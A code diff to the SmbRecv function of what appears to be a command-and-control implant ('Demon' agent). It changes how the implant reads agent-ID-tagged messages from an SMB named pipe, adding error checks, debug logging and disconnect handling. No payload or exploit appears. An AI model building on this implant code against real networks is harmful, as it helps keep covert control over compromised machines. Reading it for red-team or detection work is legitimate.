@@ -73,27 +73,41 @@ BOOL SmbRecv( PBUFFER Resp )
 
     if ( Instance.Win32.PeekNamedPipe( Instance.Config.Transport.Handle, NULL, 0, NULL, &BytesSize, NULL ) )
     {
-        if ( BytesSize > sizeof( UINT32 ) )
+        if ( BytesSize > sizeof( UINT32 ) + sizeof( UINT32 ) )
         {
-            if ( Instance.Win32.PeekNamedPipe( Instance.Config.Transport.Handle, &DemonId, sizeof( UINT32 ), NULL, &BytesSize, NULL ) )
+            if ( ! Instance.Win32.ReadFile( Instance.Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
             {
-                if ( Instance.Session.AgentID != DemonId )
-                {
-                    Resp->Length = 0;
-                    return FALSE;
-                }
-
-                Instance.Win32.ReadFile( Instance.Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesSize, NULL );
+                PRINTF( "Failed to read the DemonId from pipe, error: %d\n", NtGetLastError() )
+                Resp->Buffer = NULL;
+                Resp->Length = 0;
+                Instance.Session.Connected = FALSE;
+                return FALSE;
             }
 
-            Instance.Win32.ReadFile( Instance.Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesSize, NULL );
+            if ( Instance.Session.AgentID != DemonId )
+            {
+                PRINTF( "The message doesn't have the correct DemonId: %x\n", DemonId )
+                Resp->Buffer = NULL;
+                Resp->Length = 0;
+                Instance.Session.Connected = FALSE;
+                return FALSE;
+            }
+
+            if ( ! Instance.Win32.ReadFile( Instance.Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesSize, NULL ) && NtGetLastError() != ERROR_MORE_DATA )
+            {
+                PRINTF( "Failed to read the PackageSize from pipe, error: %d\n", NtGetLastError() )
+                Resp->Buffer = NULL;
+                Resp->Length = 0;
+                Instance.Session.Connected = FALSE;
+                return FALSE;
+            }
 
             Resp->Buffer = Instance.Win32.LocalAlloc( LPTR, PackageSize );
             Resp->Length = PackageSize;
 
             if ( ! PipeRead( Instance.Config.Transport.Handle, Resp ) )
             {
-                /* We failed to read from the pipe. cleanup. */
+                PRINTF( "PipeRead failed with to read 0x%x bytes from pipe\n", Resp->Length )
                 if ( Resp->Buffer )
                 {
                     Instance.Win32.LocalFree( Resp->Buffer );
@@ -101,19 +115,26 @@ BOOL SmbRecv( PBUFFER Resp )
                 }
 
                 Resp->Length = 0;
-
+                Instance.Session.Connected = FALSE;
                 return FALSE;
             }
+            //PRINTF("successfully read 0x%x bytes from pipe\n", PackageSize)
+        }
+        else if ( BytesSize > 0 )
+        {
+            PRINTF( "Data in the pipe is too small: 0x%x\n", BytesSize )
+        }
+        else
+        {
+            // nothing to read
         }
     }
     else
     {
         /* We disconnected */
-        if ( NtGetLastError() == ERROR_BROKEN_PIPE )
-        {
-            Instance.Session.Connected = FALSE;
-            return FALSE;
-        }
+        PRINTF( "PeekNamedPipe failed with %d\n", NtGetLastError() )
+        Instance.Session.Connected = FALSE;
+        return FALSE;
     }
 
     return TRUE;
